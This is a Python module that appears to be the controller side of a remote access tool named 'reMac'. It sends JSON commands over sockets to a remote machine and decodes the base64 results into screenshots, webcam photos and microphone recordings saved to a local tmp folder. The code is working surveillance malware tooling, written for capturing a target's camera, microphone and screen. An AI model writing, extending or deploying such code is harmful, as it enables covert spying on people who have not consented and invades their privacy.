import json
import os
import base64
from apps.libs.reMac_libbase import reMac_libbase


class reMac_libclient(reMac_libbase):
    def __init__(self, selector, sock, addr, request):
        reMac_libbase.__init__(self, selector, sock, addr)
        self.request = request
        self._recv_buffer = b""
        self._send_buffer = b""
        self._request_queued = False
        self._jsonheader_len = None
        self.jsonheader = None
        self.response = None

    def _read(self):
        try:
            # Should be ready to read
            data = self.sock.recv(4096)
        except BlockingIOError:
            # Resource temporarily unavailable (errno EWOULDBLOCK)
            pass
        else:
            if data:
                self._recv_buffer += data
            else:
                raise RuntimeError("Peer closed.")

    def _write(self):
        if self._send_buffer:
            print("sending", repr(self._send_buffer), "to", self.addr)
            try:
                # Should be ready to write
                sent = self.sock.send(self._send_buffer)
            except BlockingIOError:
                # Resource temporarily unavailable (errno EWOULDBLOCK)
                pass
            else:
                self._send_buffer = self._send_buffer[sent:]

    def _process_response_json_content(self):
        content = self.response
        result = content.get("result")
        action = content.get("action")
        try:
            result = json.loads(result)
        except Exception:
            pass
        result = json.dumps(result, indent=4, sort_keys=True)
        if action.startswith("mh")\
                or action == "in":
            print(content.get("result"))
        elif action.startswith("sc"):
            print(content.get("result"))
            cur_dir = os.path.abspath("./tmp")
            base64ToolContent = content.get("result")
            base64ToolContent = base64ToolContent.encode()
            audio_out = f"{cur_dir}/screenshot-{self.get_datetime_str()}.png"
            with open(audio_out, "wb") as output_file:
                output_file.write(base64.b64decode(base64ToolContent))
        elif action.startswith("wc"):
            print(content.get("result"))
            cur_dir = os.path.abspath("./tmp")
            print("CurDir: " + cur_dir)
            base64ToolContent = content.get("result")
            base64ToolContent = base64ToolContent.encode()

            image_out = f"{cur_dir}/webcam-{self.get_datetime_str()}.png"
            with open(image_out, "wb") as output_file:
                output_file.write(base64.b64decode(base64ToolContent))
        elif action.startswith("rm"):
            print(content.get("result"))
            cur_dir = os.path.abspath("./tmp")
            base64ToolContent = content.get("result")
            base64ToolContent = base64ToolContent.encode()
            audio_out = f"{cur_dir}/recmic-{self.get_datetime_str()}.mp3"
            with open(audio_out, "wb") as output_file:
                output_file.write(base64.b64decode(base64ToolContent))
        else:
            print(f"got result: {result}, action: {action}")

    def _process_response_binary_content(self):
        content = self.response
        print(f"got response: {repr(content)}")

    def read(self):
        self._read()

        if self._jsonheader_len is None:
            self.process_protoheader()

        if self._jsonheader_len is not None:
            if self.jsonheader is None:
                self.process_jsonheader()

        if self.jsonheader:
            if self.response is None:
                self.process_response()

    def write(self):
        if not self._request_queued:
            self.queue_request()

        self._write()

        if self._request_queued:
            if not self._send_buffer:
                # Set selector to listen for read events, we're done writing.
                self._set_selector_events_mask("r")

    def queue_request(self):
        content = self.request["content"]
        content_type = self.request["type"]
        content_encoding = self.request["encoding"]
        if content_type == "text/json":
            req = {
                "content_bytes": self._json_encode(content, content_encoding),
                "content_type": content_type,
                "content_encoding": content_encoding,
            }
        else:
            req = {
                "content_bytes": content,
                "content_type": content_type,
                "content_encoding": content_encoding,
            }
        message = self._create_message(**req)
        self._send_buffer += message
        self._request_queued = True

    def process_response(self):
        content_len = self.jsonheader["content-length"]
        if not len(self._recv_buffer) >= content_len:
            return
        data = self._recv_buffer[:content_len]
        self._recv_buffer = self._recv_buffer[content_len:]
        if self.jsonheader["content-type"] == "text/json":
            encoding = self.jsonheader["content-encoding"]
            self.response = self._json_decode(data, encoding)
            print("received response", repr(self.response), "from", self.addr)
            self._process_response_json_content()
        else:
            # Binary or unknown content-type
            self.response = data
            print(
                f'received {self.jsonheader["content-type"]} response from',
                self.addr,
            )
            self._process_response_binary_content()
        # Close when response has been processed
        self.close()
